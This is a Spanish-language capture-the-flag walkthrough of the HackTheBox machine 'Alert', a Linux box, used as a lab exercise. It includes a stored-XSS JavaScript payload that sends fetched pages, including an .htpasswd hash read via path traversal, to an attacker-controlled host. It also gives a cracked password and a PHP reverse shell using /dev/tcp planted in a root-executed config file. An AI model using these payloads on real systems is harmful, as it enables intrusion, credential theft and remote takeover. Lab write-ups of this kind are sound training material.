---
title: Alert - Easy (HTB)
permalink: /Alert-HTB-Writeup/
tags:
  - "Linux"
  - "Easy"
  - "XSS"
  - "Path Traversal"
  - "Hash Cracking"
  - "Local Port Forwarding"
  - "SSH"
  - "PHP"
  - "File Permissions"
categories:
  - hacking
  - writeup
  - hackthebox
  - "hacking web"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
  - docs
seo_tittle: Alert - Easy (HTB)
seo_description: Aprende a hacer fuzzing para encontrar subdominios, explota XSS y abusa de permisos para vencer Alert.
excerpt: Aprende a hacer fuzzing para encontrar subdominios, explota XSS y abusa de permisos para vencer Alert.
header:
  overlay_image: /assets/images/headers/alert-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/alert-hackthebox.jpg
---

![image-center](/assets/images/posts/alert-hackthebox.png){: .align-center}

**Habilidades:** Subdomain Fuzzing, Cross-Site Scripting + Directory Path Traversal, Hash Cracking, SSH Tunneling (Local Port Forwarding), Abusing Group Permissions to Write PHP Configuration File - (Privilege Escalation)
{: .notice--primary}


# Introducción

Alert es una máquina perteneciente a la plataforma de HackTheBox de dificultad `Easy` que se enfoca en explotación de vulnerabilidades web comunes y técnicas básicas de escalada de privilegios en sistemas Linux. Esta máquina se centra en el aprendizaje para principiantes, aprenderemos a abusar de configuraciones inseguras en formularios de contacto para ganar acceso al sistema y posteriormente hacernos con el control de la máquina enfrentándonos a servicios internos.

<br>

# Reconocimiento
---
Lanzaremos una traza ICMP para verificar que la máquina se encuentra activa y responda nuestras conexiones

~~~ bash
ping -c 1 10.10.11.44
PING 10.10.11.44 (10.10.11.44) 56(84) bytes of data.
64 bytes from 10.10.11.44: icmp_seq=1 ttl=63 time=140 ms

--- 10.10.11.44 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 139.794/139.794/139.794/0.000 ms
~~~


## Nmap Scanning

Empezaremos la fase de reconocimiento realizando un escaneo con `nmap` para identificar los puertos y así los servicios que tenga expuestos

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.44 -oG allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-22 14:51 EDT
Nmap scan report for 10.10.11.44
Host is up (0.24s latency).
Not shown: 59981 closed tcp ports (reset), 5552 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 18.79 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo Stealth Scan**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Mostrar el progreso

Como hemos descubierto dos puertos en la máquina víctima, haremos un segundo escaneo con el propósito de identificar la versión del servicio que se está ejecutando en cada puerto abierto

~~~ bash
nmap -sVC -p 22,80 10.10.11.44 -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-22 14:52 EDT
Nmap scan report for 10.10.11.44
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://alert.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.51 seconds
~~~

- `-p`: Especificar los puertos
- `-sV`: Identificar la versión del servicio que se ejecuta
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar en el mismo formato que se ve por consola


## Web Analysis

Vemos que nos intenta redirigir al dominio `alert.htb`, lo agregaremos a nuestro archivo `/etc/hosts` con el siguiente comando para que nuestra máquina resuelva `alert.htb` a la dirección IP `10.10.11.44` que corresponde a la máquina víctima

~~~ bash
echo '10.10.11.44 alert.htb' >> /etc/hosts
~~~

Haremos un pequeño escaneo antes de continuar para identificar las tecnologías web que pueda estar usando la máquina en su puerto `80`

~~~ bash
whatweb http://alert.htb/                                                                                      
http://alert.htb/ [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.44], RedirectLocation[index.php?page=alert], Title[Alert - Markdown Viewer]
http://alert.htb/index.php?page=alert [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.44], Title[Alert - Markdown Viewer]
~~~

### Web - Markdown Viewer

La máquina nos hace una redirección al consultar el dominio. Si nos dirigimos a `alert.htb` en nuestro navegador se nos muestra el contenido de la página a la que se nos está redirigiendo

![image-center](/assets/images/posts/alert-markdown-viewer.png){: .align-center}

Vemos que existe un apartado para cargar archivos y aparentemente la funcionalidad de esta página es ver archivos `Markdown`, esto me hace querer cargar un archivo malicioso. Por ahora crearé un archivo de ejemplo que contenga un título y una frase corta

![image-center](/assets/images/posts/alert-markdown-viewer-2.png){: .align-center}

Veremos el contenido de nuestro archivo con el botón inmenso imposible de no ver que está en medio de la página

![image-center](/assets/images/posts/alert-markdown-viewer-3.png){: .align-center}

En la esquina izquierda notaremos que podemos compartir el archivo, mucho cuidado! O.o

![image-center](/assets/images/posts/alert-share-link.png){: .align-center}

Esto nos genera un enlace que podemos compartir, el link se ve de la siguiente forma

~~~ bash
http://alert.htb/visualizer.php?link_share=67df1564c186b4.63942334.md
~~~


### Web - Contact Us

Existe una sección `Contact Us` en la que podemos enviar un mensaje, por lógica podemos deducir que alguien revisa estos mensajes, quizá algún administrador. Por lo que un vector de entrada puede ser este formulario de contacto

![image-center](/assets/images/posts/alert-contact-us.png){: .align-center}


## Fuzzing

Usaremos `fuzzing` para descubrir archivos y directorios disponibles en el servidor que no estemos logrando visualizar

~~~ bash
gobuster dir -u http://10.10.11.44/ -r -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt -t 5    
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.44/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 274]
/index.php            (Status: 200) [Size: 966]
/contact.php          (Status: 200) [Size: 24]
/uploads              (Status: 403) [Size: 274]
/css                  (Status: 403) [Size: 274]
/messages             (Status: 403) [Size: 274]
/messages.php         (Status: 200) [Size: 1]
~~~

Existe un archivo `messages.php`, que podría ser donde se muestren los mensajes que enviamos a través del formulario `Contact Us`
{: .primary--warning}

<br>

## Subdomain Fuzzing

Intentaremos descubrir subdominios para el dominio `alert.htb` usando la cabecera HTTP `Host: algo.alert.htb`

~~~ bash
wfuzz -c -H 'Host: FUZZ.alert.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hc 301 http://alert.htb/

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://alert.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload    
=====================================================================

000001261:   401        14 L     54 W       467 Ch      "statistics"
~~~

- `-c`: Formato con colores
- `-H`: Definir una cabecera HTTP
- `-w`: Definir la ruta de un diccionario de palabras a usar
- `--hc 301`: Ocultar el código de estado `301`


## Virtual Hosting

Antes de navegar hacia `statistics.alert.htb`, debemos agregar este subdominio al archivo `/etc/hosts`

~~~ bash
cat /etc/hosts | grep alert.htb    
10.10.11.44 alert.htb statistics.alert.htb
~~~

Si ahora nos dirigimos a `statistics.alert.htb`, nos encontramos con el siguiente panel de autenticación

![image-center](/assets/images/posts/alert-statistics-subdomain.png){: .align-center}


## Fuzzing - Apache Files

Buscaremos archivos existentes en este subdominio a los cuales en primera instancia no podremos acceder, por defecto nos retornarán un código de estado `403`, lo que significa que no estamos autorizados para acceder a esos recursos. Sin embargo, el objetivo de lo que estamos haciendo es verificar la existencia de archivos comunes en `apache`

~~~ bash
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt --hc 401 http://statistics.alert.htb/FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://statistics.alert.htb/FUZZ
Total requests: 8531

=====================================================================
ID           Response   Lines    Word       Chars       Payload       
=====================================================================

000000001:   403        9 L      28 W       285 Ch      ".htaccess"
000000003:   403        9 L      28 W       285 Ch      ".htpasswd"
000000002:   403        9 L      28 W       285 Ch      ".htaccess.bak"    
000000036:   403        9 L      28 W       285 Ch      "server-status"
~~~



# Explotación / Intrusión
---
## Stored Cross-Site Scripting

Recordemos la sección de `Contact Us`, intentaremos ejecutar código `javascrpt` desde un archivo `Markdown`. Crearemos un archivo malicioso que subiremos al servidor con algún nombre, por ejemplo `test.md`

- Agregaremos la etiqueta `<script>` que solicite un recurso `js` de un servidor HTTP que nosotros montaremos

> `test.md`

~~~ bash
# Test XSS
<script src=http://10.10.14.254/test.js></script>
~~~

En teoría, al visualizarse este archivo, se realizará una solicitud HTTP a nuestro servidor que tendremos iniciado con `python`, y se solicitará el recurso `test.js`. Crearemos nuestro payload que se encargue de enviarnos el contenido de un archivo que queramos visualizar, como queremos 

~~~ js
fetch("http://alert.htb/messages.php")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.14.254/?file_content=" + encodeURIComponent(data));
  });
~~~

Subimos el archivo y copiamos el link para compartirlo a través del formulario de contacto

![image-center](/assets/images/posts/alert-xss.png){: .align-center}

Pondremos el link dentro del mensaje. Antes de enviarlo, debemos poner a la escucha un servidor HTTP por nuestro puerto `80`

~~~ bash
python3 -m http.server 80
~~~ 

![image-center](/assets/images/posts/alert-xss-2.png){: .align-center}

Una vez hayamos enviado el mensaje, la víctima cuando vea el mensaje supuestamente nos enviará el contenido del archivo `messages.php`

~~~ bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.44 - - [22/Mar/2025 16:37:27] "GET /test.js HTTP/1.1" 200 -
10.10.11.44 - - [22/Mar/2025 16:37:28] "GET /?file_content=%3Ch1%3EMessages%3C%2Fh1%3E%3Cul%3E%3Cli%3E%3Ca%20href%3D%27messages.php%3Ffile%3D2024-03-10_15-48-34.txt%27%3E2024-03-10_15-48-34.txt%3C%2Fa%3E%3C%2Fli%3E%3C%2Ful%3E%0A HTTP/1.1" 200 -
~~~

Si decodificamos el valor que viajó en la variable `file_content` que nosotros definimos, podemos ver que se trata de etiquetas `HTML`

~~~ html
<h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
~~~

Es interesante lo que logramos visualizar, porque ahora sabemos que `messages.php` puede recibir una variable `file`


## Cross-Site Scripting + Directory Path Traversal

Recordemos que en el subdominio `statistics.alert.htb` existen archivos como `.htaccess`, que aunque no tengamos acceso desde fuera quizás si podamos acceder mediante el XSS que estamos explotando en `alert.htb`

Modificaremos nuestro script para recibir el contenido de ese archivo intentando retroceder varios directorios y luego dirigiéndonos a `/var/www/statistics.alert.htb/.htpasswd`

> `xss.js`

~~~ js
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.14.254/?file_content=" + encodeURIComponent(data));

  });
~~~

Si has guardado este payload en otro archivo al igual que yo, **debes considerar apuntar a ese nuevo archivo desde `test.md`**

~~~ bash
# Hola
<script src=http://10.10.14.254/xss.js></script>
~~~

![image-center](/assets/images/posts/alert-path-traversal.png){: .align-center}

Repetimos los pasos que hicimos anteriormente cuando nos trajimos el contenido del archivo `messages.php` 

- Enviamos el archivo `test.md` al `Markdown Viewer`
- Generamos el enlace para compartir el archivo
- Copiamos el enlace y lo enviamos a través del formulario `Contact Us`

Antes de enviar el mensaje debemos tener el servidor HTTP a la espera de conexiones

~~~ bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.44 - - [22/Mar/2025 16:53:02] "GET /xss.js HTTP/1.1" 200 -
10.10.11.44 - - [22/Mar/2025 16:53:03] "GET /?file_content=%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A HTTP/1.1" 200 -
~~~

Si hacemos la decodificación de URL del valor que hemos recibido, nos queda lo siguiente

~~~ html
<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
</pre>
~~~


## Hash Cracking

Guardaremos en un archivo este hash para intentar crackearlo con `john`, eliminando la etiqueta `<pre>`

> `hash.txt`

~~~ bash
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
~~~

~~~ bash
john -w:/usr/share/wordlists/rockyou.txt hash.txt --format=md5crypt-long
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (albert)     
1g 0:00:00:00 DONE (2025-03-22 17:10) 6.250g/s 17600p/s 17600c/s 17600C/s meagan..medicina
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~

Y la contraseña encontrada es `manchesterunited`. Podemos usar estas credenciales para conectarnos a la web de `statistics.alert.htb`. Además intentaremos verificar si se reutilizan estas credenciales y nos permite conectarnos como el usuario `albert` proporcionando las mismas credenciales por `ssh`

~~~ bash
ssh albert@10.10.11.44 

The authenticity of host \'10.10.11.44 (10.10.11.44)' can't be established.
ED25519 key fingerprint is SHA256:p09n9xG9WD+h2tXiZ8yi4bbPrvHxCCOpBLSw0o76zOs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.44' (ED25519) to the list of known hosts.
albert@10.10.11.44\'s password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-200-generic x86_64)
...
...
Last login: Sat Mar 22 19:49:05 2025 from 10.10.14.166
albert@alert:~$ 
~~~



# Escalada de privilegios
---
Lo primero que podemos hacer es cambiar el valor de la variable de entorno `TERM` para poder hacer `Ctrl + L` y así limpiar la pantalla

~~~ bash
export TERM=xterm
~~~


## (Posible) System Enumeration

Una de las vías más comunes de enumeración en Linux son los privilegios del grupo `sudoers`, binarios `suid`, `capabilites`, tareas `cron`, etc. Si hacemos una enumeración básica del sistema no tendremos resultados esperanzadores

~~~ bash
albert@alert:~$ sudo -l
[sudo] password for albert: 
Sorry, user albert may not run sudo on alert.
~~~

~~~ bash
albert@alert:~$ getcap -r / 2>/dev/null
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
~~~

~~~ bash
albert@alert:~$ crontab -l
no crontab for albert
~~~

~~~ bash
find / -perm /4000 2>/dev/null
/opt/google/chrome/chrome-sandbox
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
~~~


## System Enumeration - Internally Open Ports

Enumerando la máquina podemos ver que el puerto `8080` que está abierto de forma interna, esto significa que solamente es accesible desde la máquina víctima

~~~ bash
ss -tunl
~~~

![image-center](/assets/images/posts/alert-open-ports.png){: .align-center}


## SSH Local Port Forwarding

Haremos que este puerto sea accesible desde nuestra máquina atacante aprovechando la autenticación `ssh` con el siguiente comando

~~~ bash
ssh -L 8080:127.0.0.1:8080 albert@10.10.11.44
albert@10.10.11.44\'s password:
albert@alert:~$
~~~

Si listamos los puertos abiertos en nuestra máquina atacante veremos el puerto `8080` abierto hacia la IP de la máquina víctima. Ya podremos ver el contenido de este servicio si le hacemos una petición a ese puerto que usamos de túnel

~~~ bash
curl http://127.0.0.1:8080 -I
HTTP/1.1 200 OK
Host: 127.0.0.1:8080
Date: Sat, 22 Mar 2025 21:34:39 GMT
Connection: close
X-Powered-By: PHP/7.4.3-4ubuntu2.24
Content-type: text/html; charset=UTF-8
~~~

- `-I`: Ver solamente las cabeceras HTTP de la respuesta del servidor


## Root Time - Abusing Config File 

Dentro del directorio `/opt`, tenemos capacidad de escritura de un archivo de configuración donde el propietario es `root` bajo la ruta `/website-monitor/`. Esto es posible gracias a que somos parte del grupo `management` con el usuario `albert`

~~~ bash
albert@alert:~$ ls -l /opt/website-monitor/config
total 4
-rwxrwxr-x 1 root management 49 Mar 22 21:41 configuration.php

albert@alert:/opt/website-monitor$ cat config/configuration.php 
<?php
define('PATH', '/opt/website-monitor');
?>

albert@alert:/opt/website-monitor$ id
uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
~~~

Agregamos una reverse shell al archivo `configuration.php`, podemos usar `nano`

~~~ bash
albert@alert:/opt/website-monitor/config$ nano configuration.php
~~~

> `PHP Payload`

~~~ php
exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.x.x/port 0>&1'");
~~~

El archivo debería lucir más o menos de la siguiente forma. Antes de guardar los cambios, pondremos un puerto a la escucha con `netcat`

~~~ bash
nc -lvnp 4646
~~~

Posteriormente, guardaremos el archivo y saldremos de nano con `Ctrl +X`, daremos dos veces a `Y`

~~~ bash
<?php
exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.254/4646 0>&1'");
define('PATH', '/opt/website-monitor');
?>
~~~

Al cabo de unos segundos, deberíamos recibir la conexión como usuario `root`

~~~ bash
nc -lvnp 4646
listening on [any] 4646 ...
connect to [10.10.14.254] from (UNKNOWN) [10.10.11.44] 51640
bash: cannot set terminal process group (1007): Inappropriate ioctl for device
bash: no job control in this shell
root@alert:~# id
id
uid=0(root) gid=0(root) groups=0(root)
~~~


